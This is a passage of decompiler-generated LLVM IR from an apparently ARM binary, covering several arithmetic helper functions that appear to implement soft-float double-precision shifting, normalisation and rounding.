  br label %dec_label_pc_1a36c

dec_label_pc_1a36c:                               ; preds = %bb14, %dec_label_pc_1a350
  %tmp18 = icmp ugt i32 %v0_1a36c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a36c
  %v6_1a370 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1a370, i32* %r4.global-to-local, align 4
  store i32 %v6_1a318, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a36c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1a318)
  %v0_1a378 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a378 = icmp sgt i32 %v0_1a378, -1
  %v4_1a384 = urem i32 %v0_1a378, 1048576
  %v5_1a384 = or i32 %v4_1a384, 1048576
  store i32 %v5_1a384, i32* %r1.global-to-local, align 4
  br i1 %v3_1a378, label %dec_label_pc_1a394, label %dec_label_pc_1a38c

dec_label_pc_1a38c:                               ; preds = %bb16
  %v0_1a38c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a38c = sub i32 0, %v0_1a38c
  store i32 %v1_1a38c, i32* %r0.global-to-local, align 4
  %v2_1a38c = icmp eq i32 %v0_1a38c, 0
  %v2_1a390 = icmp eq i1 %v2_1a38c, false
  %v5_1a390 = sext i1 %v2_1a390 to i32
  %v6_1a390 = sub nsw i32 %v5_1a390, %v5_1a384
  store i32 %v6_1a390, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a394

dec_label_pc_1a394:                               ; preds = %bb16, %dec_label_pc_1a38c
  %v0_1a394 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a394 = icmp sgt i32 %v0_1a394, -1
  %v4_1a39c = urem i32 %v0_1a394, 1048576
  %v5_1a39c = or i32 %v4_1a39c, 1048576
  store i32 %v5_1a39c, i32* %r3.global-to-local, align 4
  br i1 %v3_1a394, label %dec_label_pc_1a3ac, label %dec_label_pc_1a3a4

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a394
  %v0_1a3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a3a4 = sub i32 0, %v0_1a3a4
  store i32 %v1_1a3a4, i32* %r2.global-to-local, align 4
  %v2_1a3a4 = icmp eq i32 %v0_1a3a4, 0
  %v2_1a3a8 = icmp eq i1 %v2_1a3a4, false
  %v5_1a3a8 = sext i1 %v2_1a3a8 to i32
  %v6_1a3a8 = sub nsw i32 %v5_1a3a8, %v5_1a39c
  store i32 %v6_1a3a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a3ac

dec_label_pc_1a3ac:                               ; preds = %dec_label_pc_1a394, %dec_label_pc_1a3a4
  %v0_1a3ac = load i32, i32* %r4.global-to-local, align 4
  %v1_1a3ac = load i32, i32* %r5.global-to-local, align 4
  %v4_1a3ac = icmp eq i32 %v1_1a3ac, %v0_1a3ac
  call void @__pseudo_cond_branch(i1 %v4_1a3ac, i32 ptrtoint (i32* @global_var_1a55c.981 to i32))
  %v1_1a3b0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a3b0

; uselistorder directives
  uselistorder i32 %v0_1a394, { 1, 0 }
  uselistorder i32 %v0_1a378, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1a344, { 2, 1, 0 }
  uselistorder i32 %v3_1a340, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a328, { 1, 0 }
  uselistorder i32 %v2_1a320, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1a31c, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_1a394, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1a36c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a3b4() local_unnamed_addr {
dec_label_pc_1a3b4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1a3b4 = load i32, i32* @r4, align 4
  %v1_1a3b4 = add i32 %v0_1a3b4, -1
  store i32 %v1_1a3b4, i32* @r4, align 4
  %v0_1a3b8 = load i32, i32* @r5, align 4
  %v1_1a3b8 = sub i32 32, %v0_1a3b8
  store i32 %v1_1a3b8, i32* @lr, align 4
  %v5_1a3bc = icmp sgt i32 %v0_1a3b8, 32
  br i1 %v5_1a3bc, label %dec_label_pc_1a3d8, label %dec_label_pc_1a3c0

dec_label_pc_1a3c0:                               ; preds = %dec_label_pc_1a3b4
  %v0_1a3c0 = load i32, i32* @r2, align 4
  %v6_1a3c0 = shl i32 %v0_1a3c0, %v1_1a3b8
  store i32 %v6_1a3c0, i32* %ip.global-to-local, align 4
  %v0_1a3c4 = load i32, i32* @r0, align 4
  %v3_1a3c4 = add i32 %v0_1a3b8, -1
  %v4_1a3c4 = shl i32 1, %v3_1a3c4
  %v7_1a3c4 = lshr i32 %v0_1a3c0, %v0_1a3b8
  %v8_1a3c4 = add i32 %v0_1a3c4, %v7_1a3c4
  %v9_1a3c4 = icmp ult i32 %v8_1a3c4, %v0_1a3c4
  %v0_1a3c8 = load i32, i32* @r1, align 4
  %v2_1a3c8 = zext i1 %v9_1a3c4 to i32
  %v3_1a3c8 = add i32 %v2_1a3c8, %v0_1a3c8
  %v1_1a3cc = load i32, i32* @r3, align 4
  %v7_1a3cc = shl i32 %v1_1a3cc, %v1_1a3b8
  %v8_1a3cc = add i32 %v7_1a3cc, %v8_1a3c4
  store i32 %v8_1a3cc, i32* %r0.global-to-local, align 4
  %v5_1a3d0 = and i32 %v1_1a3cc, %v4_1a3c4
  %v6_1a3d0 = icmp ne i32 %v5_1a3d0, 0
  %v7_1a3d0 = ashr i32 %v1_1a3cc, %v0_1a3b8
  %v9_1a3d0 = add i32 %v3_1a3c8, %v7_1a3d0
  %v10_1a3d0 = zext i1 %v6_1a3d0 to i32
  %v11_1a3d0 = add i32 %v10_1a3d0, %v9_1a3d0
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3d8:                               ; preds = %dec_label_pc_1a3b4
  %v1_1a3d8 = add i32 %v0_1a3b8, -32
  %v1_1a3dc = add i32 %v1_1a3b8, 32
  store i32 %v1_1a3dc, i32* @lr, align 4
  %v0_1a3e4 = load i32, i32* @r3, align 4
  %v2_1a3e4 = add i32 %v1_1a3b8, 31
  %v3_1a3e4 = lshr i32 -2147483648, %v2_1a3e4
  %v4_1a3e4 = and i32 %v0_1a3e4, %v3_1a3e4
  %v5_1a3e4 = icmp ne i32 %v4_1a3e4, 0
  %v6_1a3e4 = shl i32 %v0_1a3e4, %v1_1a3dc
  %v2_1a3e8 = or i32 %v6_1a3e4, 2
  %v2_1a3e8.v6_1a3e4 = select i1 %v5_1a3e4, i32 %v2_1a3e8, i32 %v6_1a3e4
  store i32 %v2_1a3e8.v6_1a3e4, i32* %ip.global-to-local, align 4
  %v0_1a3ec = load i32, i32* @r0, align 4
  %v7_1a3ec = ashr i32 %v0_1a3e4, %v1_1a3d8
  %v8_1a3ec = add i32 %v0_1a3ec, %v7_1a3ec
  store i32 %v8_1a3ec, i32* %r0.global-to-local, align 4
  %v0_1a3f0 = load i32, i32* @r1, align 4
  %v2_1a3f0 = and i32 %v0_1a3e4, 1073741824
  %v3_1a3f0 = icmp ne i32 %v2_1a3f0, 0
  %v4_1a3f0 = ashr i32 %v0_1a3e4, 31
  %v6_1a3f0 = add i32 %v0_1a3f0, %v4_1a3f0
  %v7_1a3f0 = zext i1 %v3_1a3f0 to i32
  %v8_1a3f0 = add i32 %v6_1a3f0, %v7_1a3f0
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3f4:                               ; preds = %dec_label_pc_1a3c0, %dec_label_pc_1a3d8
  %storemerge = phi i32 [ %v11_1a3d0, %dec_label_pc_1a3c0 ], [ %v8_1a3f0, %dec_label_pc_1a3d8 ]
  %v0_1a3f4 = phi i32 [ %v11_1a3d0, %dec_label_pc_1a3c0 ], [ %v8_1a3f0, %dec_label_pc_1a3d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1a3f4 = and i32 %v0_1a3f4, -2147483648
  store i32 %v1_1a3f4, i32* @r5, align 4
  %v1_1a3f8 = icmp sgt i32 %v0_1a3f4, -1
  call void @__pseudo_cond_branch(i1 %v1_1a3f8, i32 ptrtoint (i32* @global_var_1a408.982 to i32))
  %v0_1a3fc = load i32, i32* %ip.global-to-local, align 4
  %v1_1a3fc = sub i32 0, %v0_1a3fc
  store i32 %v1_1a3fc, i32* %ip.global-to-local, align 4
  %v2_1a3fc = icmp eq i32 %v0_1a3fc, 0
  %v0_1a400 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a400 = icmp eq i1 %v2_1a3fc, false
  %v5_1a400 = sext i1 %v2_1a400 to i32
  %v6_1a400 = sub i32 %v5_1a400, %v0_1a400
  store i32 %v6_1a400, i32* %r0.global-to-local, align 4
  %v7_1a400 = zext i1 %v2_1a400 to i32
  %v8_1a400 = icmp ne i32 %v6_1a400, %v7_1a400
  %v9_1a400 = icmp ne i32 %v0_1a400, -1
  %v10_1a400 = or i1 %v9_1a400, %v8_1a400
  %v11_1a400 = icmp ne i32 %v0_1a400, 0
  %v12_1a400 = select i1 %v2_1a400, i1 %v10_1a400, i1 %v11_1a400
  %v0_1a404 = load i32, i32* %r1.global-to-local, align 4
  %v5_1a404 = sext i1 %v12_1a400 to i32
  %v6_1a404 = sub i32 %v5_1a404, %v0_1a404
  store i32 %v6_1a404, i32* @r1, align 4
  ret i32 %v6_1a400

; uselistorder directives
  uselistorder i1 %v2_1a400, { 1, 2, 0 }
  uselistorder i32 %v0_1a400, { 1, 2, 0 }
  uselistorder i32 %v8_1a3f0, { 1, 0 }
  uselistorder i32 %v0_1a3e4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1a3d0, { 1, 0 }
  uselistorder i32 %v1_1a3cc, { 1, 0, 2 }
  uselistorder i32 %v0_1a3c4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a3f4, { 1, 0 }
}

define i32 @function_1a408(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a408:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1a408 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a40c = icmp ult i32 %v0_1a408, 1048574
  br i1 %v3_1a40c, label %dec_label_pc_1a450, label %dec_label_pc_1a410

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a408
  %v3_1a414 = icmp ult i32 %v0_1a408, 2097150
  br i1 %v3_1a414, label %dec_label_pc_1a434, label %dec_label_pc_1a418

dec_label_pc_1a418:                               ; preds = %dec_label_pc_1a410
  %v1_1a418 = urem i32 %v0_1a408, 2
  %v2_1a418 = icmp ne i32 %v1_1a418, 0
  %v3_1a418 = udiv i32 %v0_1a408, 2
  store i32 %v3_1a418, i32* %r1.global-to-local, align 4
  %v0_1a41c = load i32, i32* %r0.global-to-local, align 4
  %v3_1a41c = zext i1 %v2_1a418 to i32
  %v6_1a41c = zext i32 %v0_1a41c to i64
  %v7_1a41c = sub i32 33, %v0_1a41c
  %v8_1a41c = zext i32 %v7_1a41c to i64
  %v9_1a41c = shl i64 %v6_1a41c, %v8_1a41c
  %v10_1a41c = sub i32 32, %v0_1a41c
  %v11_1a41c = shl i32 %v3_1a41c, %v10_1a41c
  %v12_1a41c = zext i32 %v11_1a41c to i64
  %v14_1a41c = or i64 %v12_1a41c, %v9_1a41c
  %v15_1a41c = trunc i64 %v14_1a41c to i32
  %v16_1a41c = add i32 %v0_1a41c, -1
  %v17_1a41c = shl i32 1, %v16_1a41c
  %v18_1a41c = and i32 %v17_1a41c, %v0_1a41c
  %v19_1a41c = icmp ne i32 %v18_1a41c, 0
  store i32 %v15_1a41c, i32* %r0.global-to-local, align 4
  %v0_1a420 = load i32, i32* @ip, align 4
  %v3_1a420 = zext i1 %v19_1a41c to i32
  %v6_1a420 = zext i32 %v0_1a420 to i64
  %v7_1a420 = sub i32 33, %v0_1a420
  %v8_1a420 = zext i32 %v7_1a420 to i64
  %v9_1a420 = shl i64 %v6_1a420, %v8_1a420
  %v10_1a420 = sub i32 32, %v0_1a420
  %v11_1a420 = shl i32 %v3_1a420, %v10_1a420
  %v12_1a420 = zext i32 %v11_1a420 to i64
  %v14_1a420 = or i64 %v12_1a420, %v9_1a420
  %v15_1a420 = trunc i64 %v14_1a420 to i32
  store i32 %v15_1a420, i32* @ip, align 4
  %v0_1a424 = load i32, i32* @r4, align 4
  %v1_1a424 = add i32 %v0_1a424, 1
  store i32 %v1_1a424, i32* @r4, align 4
  %v3_1a428 = mul i32 %v1_1a424, 2097152
  %v2_1a42c = icmp ugt i32 %v3_1a428, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1a42c, i32 ptrtoint (i32* @global_var_1a5e4.983 to i32))
  br label %dec_label_pc_1a434

dec_label_pc_1a434:                               ; preds = %dec_label_pc_1a450, %dec_label_pc_1a410, %dec_label_pc_1a418
  %v0_1a434 = load i32, i32* @ip, align 4
  %v2_1a434 = icmp slt i32 %v0_1a434, 0
  %v6_1a434 = icmp eq i32 %v0_1a434, -2147483648
  %v1_1a438 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a434, label %bb, label %dec_label_pc_1a434._crit_edge

bb:                                               ; preds = %dec_label_pc_1a434
  %v2_1a438 = urem i32 %v1_1a438, 2
  %v3_1a438 = icmp ne i32 %v2_1a438, 0
  br label %dec_label_pc_1a434._crit_edge

dec_label_pc_1a434._crit_edge:                    ; preds = %dec_label_pc_1a434, %bb
  %v1_1a43c = phi i1 [ %v3_1a438, %bb ], [ %v2_1a434, %dec_label_pc_1a434 ]
  %v2_1a43c = zext i1 %v1_1a43c to i32
  %v3_1a43c = add i32 %v2_1a43c, %v1_1a438
  store i32 %v3_1a43c, i32* %r0.global-to-local, align 4
  %v0_1a440 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a440 = load i32, i32* @r4, align 4
  %v2_1a440 = and i32 %v1_1a440, 4096
  %v3_1a440 = icmp ne i32 %v2_1a440, 0
  %v4_1a440 = mul i32 %v1_1a440, 1048576
  %v6_1a440 = add i32 %v4_1a440, %v0_1a440
  %v7_1a440 = zext i1 %v3_1a440 to i32
  %v8_1a440 = add i32 %v7_1a440, %v6_1a440
  %v1_1a444 = load i32, i32* @r5, align 4
  %v2_1a444 = or i32 %v1_1a444, %v8_1a440
  store i32 %v2_1a444, i32* %r1.global-to-local, align 4
  ret i32 %v3_1a43c

dec_label_pc_1a450:                               ; preds = %dec_label_pc_1a408
  %v0_1a450 = load i32, i32* @ip, align 4
  %v1_1a450 = icmp slt i32 %v0_1a450, 0
  %v2_1a450 = mul i32 %v0_1a450, 2
  store i32 %v2_1a450, i32* @ip, align 4
  %v0_1a454 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a454 = mul i32 %v0_1a454, 2
  %v4_1a454 = zext i1 %v1_1a450 to i32
  %v5_1a454 = or i32 %v3_1a454, %v4_1a454
  store i32 %v5_1a454, i32* %r0.global-to-local, align 4
  %v9_1a454 = icmp ule i32 %v5_1a454, %v0_1a454
  %v10_1a454 = icmp ult i32 %v3_1a454, %v0_1a454
  %v11_1a454 = select i1 %v1_1a450, i1 %v9_1a454, i1 %v10_1a454
  %v3_1a458 = mul i32 %v0_1a408, 2
  %v4_1a458 = zext i1 %v11_1a454 to i32
  %v5_1a458 = or i32 %v4_1a458, %v3_1a458
  store i32 %v5_1a458, i32* %r1.global-to-local, align 4
  %v1_1a45c = and i32 %v3_1a458, 1048576
  %v2_1a45c = icmp eq i32 %v1_1a45c, 0
  %v0_1a460 = load i32, i32* @r4, align 4
  %v1_1a460 = add i32 %v0_1a460, -1
  store i32 %v1_1a460, i32* @r4, align 4
  br i1 %v2_1a45c, label %bb7, label %dec_label_pc_1a434

bb7:                                              ; preds = %dec_label_pc_1a450
  ret i32 %v5_1a454

; uselistorder directives
  uselistorder i32 %v0_1a454, { 1, 2, 0 }
  uselistorder i1 %v1_1a450, { 1, 0 }
  uselistorder i32 %v1_1a438, { 1, 0 }
  uselistorder i32 %v0_1a434, { 1, 0 }
  uselistorder i32 %v0_1a420, { 1, 0, 2 }
  uselistorder i32 %v0_1a41c, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a434._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a434, { 0, 2, 1 }
}

define i32 @function_1a468() local_unnamed_addr {
dec_label_pc_1a468:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1a468 = load i32, i32* @r1, align 4
  %v2_1a468 = icmp eq i32 %v0_1a468, 0
  br i1 %v2_1a468, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1a468
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1a468
  %v1_1a47410 = load i32, i32* @r0, align 4
  store i32 %v1_1a47410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1a4d0 = phi i32 [ %v0_1a468, %bb ], [ %v1_1a47410, %bb38 ]
  %v1_1a488 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1a480 = icmp ugt i32 %v0_1a4d0, 65535
  br i1 %v2_1a480, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1a484 = and i32 %v0_1a4d0, 32768
  %v3_1a484 = icmp eq i32 %v2_1a484, 0
  %v4_1a484 = udiv i32 %v0_1a4d0, 65536
  br i1 %v3_1a484, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1a488 = add nsw i32 %v1_1a488, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1a494 = phi i32 [ %v1_1a488, %.thread ], [ %v1_1a488, %bb39 ], [ %v2_1a488, %bb40 ]
  %v1_1a490 = phi i32 [ %v0_1a4d0, %.thread ], [ %v4_1a484, %bb39 ], [ %v4_1a484, %bb40 ]
  %v2_1a48c = icmp ugt i32 %v1_1a490, 255
  br i1 %v2_1a48c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1a490 = and i32 %v1_1a490, 128
  %v3_1a490 = icmp eq i32 %v2_1a490, 0
  %v4_1a490 = udiv i32 %v1_1a490, 256
  br i1 %v3_1a490, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1a494 = add nsw i32 %v1_1a494, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1a4a0 = phi i32 [ %v1_1a494, %.thread3 ], [ %v1_1a494, %bb41 ], [ %v2_1a494, %bb42 ]
  %v1_1a49c = phi i32 [ %v1_1a490, %.thread3 ], [ %v4_1a490, %bb41 ], [ %v4_1a490, %bb42 ]
  %v2_1a498 = icmp ugt i32 %v1_1a49c, 15
  br i1 %v2_1a498, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1a49c = and i32 %v1_1a49c, 8
  %v3_1a49c = icmp eq i32 %v2_1a49c, 0
  %v4_1a49c = udiv i32 %v1_1a49c, 16
  br i1 %v3_1a49c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1a4a0 = add nsw i32 %v1_1a4a0, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1a4a8 = phi i32 [ %v1_1a4a0, %.thread4 ], [ %v1_1a4a0, %bb43 ], [ %v2_1a4a0, %bb44 ]
  %v1_1a4b0 = phi i32 [ %v1_1a49c, %.thread4 ], [ %v4_1a49c, %bb43 ], [ %v4_1a49c, %bb44 ]
  %v2_1a4a4 = icmp ugt i32 %v1_1a4b0, 3
  br i1 %v2_1a4a4, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1a4a8 = add i32 %v1_1a4a8, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1a4ac = udiv i32 %v1_1a4b0, 2
  %v6_1a4ac = sub i32 %v1_1a4a8, %v5_1a4ac
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1a4b0 = phi i32 [ %v6_1a4ac, %.thread6 ], [ %v2_1a4a8, %bb45 ]
  %v4_1a4b0 = udiv i32 %v1_1a4b0, 8
  %v5_1a4b0 = sub i32 %v0_1a4b0, %v4_1a4b0
  %v2_1a4b4 = add i32 %v5_1a4b0, -32
  %v4_1a4b4 = sub i32 31, %v5_1a4b0
  %v5_1a4b4 = and i32 %v4_1a4b4, %v5_1a4b0
  %v8_1a4b4 = icmp eq i32 %v5_1a4b0, 32
  %v6_1a4b8 = icmp slt i32 %v5_1a4b0, 32
  br i1 %v6_1a4b8, label %dec_label_pc_1a4bc, label %dec_label_pc_1a4dc

dec_label_pc_1a4bc:                               ; preds = %bb46
  %v2_1a4bc = add i32 %v5_1a4b0, -20
  %v7_1a4c0 = icmp sgt i32 %v2_1a4b4, -12
  br i1 %v7_1a4c0, label %dec_label_pc_1a4c4, label %dec_label_pc_1a4d8

dec_label_pc_1a4c4:                               ; preds = %dec_label_pc_1a4bc
  %v1_1a4c8 = sub i32 32, %v5_1a4b0
  %v6_1a4cc = shl i32 %v0_1a4d0, %v5_1a4b0
  store i32 %v6_1a4cc, i32* @r0, align 4
  %v6_1a4d0 = lshr i32 %v0_1a4d0, %v1_1a4c8
  store i32 %v6_1a4d0, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1a4d8:                               ; preds = %dec_label_pc_1a4bc
  %v8_1a4bc = icmp eq i32 %v2_1a4bc, 0
  %v4_1a4bc = add i32 %v5_1a4b0, 2147483616
  %v5_1a4bc = and i32 %v2_1a4bc, %v4_1a4bc
  br label %dec_label_pc_1a4dc

dec_label_pc_1a4dc:                               ; preds = %bb46, %dec_label_pc_1a4d8
  %v1_1a4e8.in = phi i32 [ %v2_1a4b4, %bb46 ], [ %v2_1a4bc, %dec_label_pc_1a4d8 ]
  %v6_1a4e8 = phi i32 [ %v2_1a4b4, %bb46 ], [ %v5_1a4b0, %dec_label_pc_1a4d8 ]
  %v2_1a4e8.in = phi i32 [ %v5_1a4b4, %bb46 ], [ %v5_1a4bc, %dec_label_pc_1a4d8 ]
  %v0_1a4e8 = phi i1 [ %v8_1a4b4, %bb46 ], [ %v8_1a4bc, %dec_label_pc_1a4d8 ]
  %v1_1a4e8 = icmp slt i32 %v1_1a4e8.in, 0
  %v2_1a4e8 = icmp slt i32 %v2_1a4e8.in, 0
  %v3_1a4dc = xor i1 %v2_1a4e8, %v1_1a4e8
  %v4_1a4dc = or i1 %v0_1a4e8, %v3_1a4dc
  br i1 %v4_1a4dc, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1a4dc
  %v6_1a4dc = sub i32 32, %v6_1a4e8
  store i32 %v6_1a4dc, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1a4dc, %bb47
  %v6_1a4e0 = shl i32 %v0_1a4d0, %v6_1a4e8
  store i32 %v6_1a4e0, i32* %r1.global-to-local, align 4
  br i1 %v4_1a4dc, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1a4e4 = load i32, i32* @r0, align 4
  %v7_1a4e4 = load i32, i32* @ip, align 4
  %v12_1a4e4 = lshr i32 %v6_1a4e4, %v7_1a4e4
  %v13_1a4e4 = or i32 %v12_1a4e4, %v6_1a4e0
  store i32 %v13_1a4e4, i32* %r1.global-to-local, align 4
  %v11_1a4e8 = shl i32 %v6_1a4e4, %v6_1a4e8
  store i32 %v11_1a4e8, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1a4c4, %bb49
  %v6_1a4f0 = phi i32 [ %v6_1a4d0, %dec_label_pc_1a4c4 ], [ %v13_1a4e4, %bb49 ], [ %v6_1a4e0, %bb48 ]
  %v0_1a4ec = load i32, i32* @r4, align 4
  %v2_1a4ec = sub i32 %v0_1a4ec, %v5_1a4b0
  store i32 %v2_1a4ec, i32* %r4.global-to-local, align 4
  %v4_1a4ec = xor i32 %v0_1a4ec, %v5_1a4b0
  %v5_1a4ec = xor i32 %v2_1a4ec, %v0_1a4ec
  %v6_1a4ec = and i32 %v5_1a4ec, %v4_1a4ec
  %v7_1a4ec = icmp slt i32 %v6_1a4ec, 0
  %v8_1a4ec = icmp slt i32 %v2_1a4ec, 0
  %v5_1a4f0 = icmp slt i32 %v0_1a4ec, %v5_1a4b0
  br i1 %v5_1a4f0, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1a4f0 = mul i32 %v2_1a4ec, 1048576
  %v11_1a4f0 = add i32 %v10_1a4f0, %v6_1a4f0
  %v7_1a4f4 = load i32, i32* @r5, align 4
  %v8_1a4f4 = or i32 %v7_1a4f4, %v11_1a4f0
  store i32 %v8_1a4f4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1a4fc = xor i1 %v8_1a4ec, %v7_1a4ec
  %v4_1a4fc = xor i1 %v3_1a4fc, true
  call void @__pseudo_cond_branch(i1 %v4_1a4fc, i32 %tmp33)
  %v0_1a500 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a504 = sub i32 -32, %v0_1a500
  store i32 %v2_1a504, i32* %r4.global-to-local, align 4
  %v6_1a508 = icmp sgt i32 %v0_1a500, -32
  br i1 %v6_1a508, label %dec_label_pc_1a50c, label %dec_label_pc_1a54c

dec_label_pc_1a50c:                               ; preds = %.thread8
  %v1_1a50c = add i32 %v2_1a504, 12
  store i32 %v1_1a50c, i32* %r4.global-to-local, align 4
  %v8_1a510 = icmp sgt i32 %v1_1a50c, 0
  br i1 %v8_1a510, label %dec_label_pc_1a530, label %dec_label_pc_1a514

dec_label_pc_1a514:                               ; preds = %dec_label_pc_1a50c
  %v1_1a514 = add i32 %v2_1a504, 32
  %v1_1a518 = sub i32 0, %v2_1a504
  %v0_1a51c = load i32, i32* @r0, align 4
  %v6_1a51c = lshr i32 %v0_1a51c, %v1_1a514
  %v1_1a520 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a520 = shl i32 %v1_1a520, %v1_1a518
  %v8_1a520 = or i32 %v7_1a520, %v6_1a51c
  %v0_1a524 = load i32, i32* @r5, align 4
  %v7_1a524 = lshr i32 %v1_1a520, %v1_1a514
  %v8_1a524 = or i32 %v0_1a524, %v7_1a524
  store i32 %v8_1a524, i32* %r1.global-to-local, align 4
  %v2_1a528 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a528, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a520

dec_label_pc_1a530:                               ; preds = %dec_label_pc_1a50c
  %v1_1a530 = sub i32 0, %v2_1a504
  %v1_1a534 = add i32 %v2_1a504, 32
  %v0_1a538 = load i32, i32* @r0, align 4
  %v6_1a538 = lshr i32 %v0_1a538, %v1_1a534
  %v1_1a53c = load i32, i32* %r1.global-to-local, align 4
  %v7_1a53c = shl i32 %v1_1a53c, %v1_1a530
  %v8_1a53c = or i32 %v7_1a53c, %v6_1a538
  %v0_1a540 = load i32, i32* @r5, align 4
  store i32 %v0_1a540, i32* %r1.global-to-local, align 4
  %v2_1a544 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a544, i32* %r4.global-to-local, align 4
  ret i32 %v8_1a53c

dec_label_pc_1a54c:                               ; preds = %.thread8
  %v0_1a54c = load i32, i32* %r1.global-to-local, align 4
  %v6_1a54c = lshr i32 %v0_1a54c, %v2_1a504
  %v0_1a550 = load i32, i32* @r5, align 4
  store i32 %v0_1a550, i32* %r1.global-to-local, align 4
  %v2_1a554 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1a554, i32* %r4.global-to-local, align 4
  ret i32 %v6_1a54c

; uselistorder directives
  uselistorder i32 %v2_1a504, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1a4ec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a4ec, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1a4e0, { 1, 0, 2 }
  uselistorder i32 %v2_1a4b4, { 1, 0, 2 }
  uselistorder i32 %v5_1a4b0, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1a49c, { 1, 0 }
  uselistorder i32 %v1_1a49c, { 1, 0, 2, 3 }
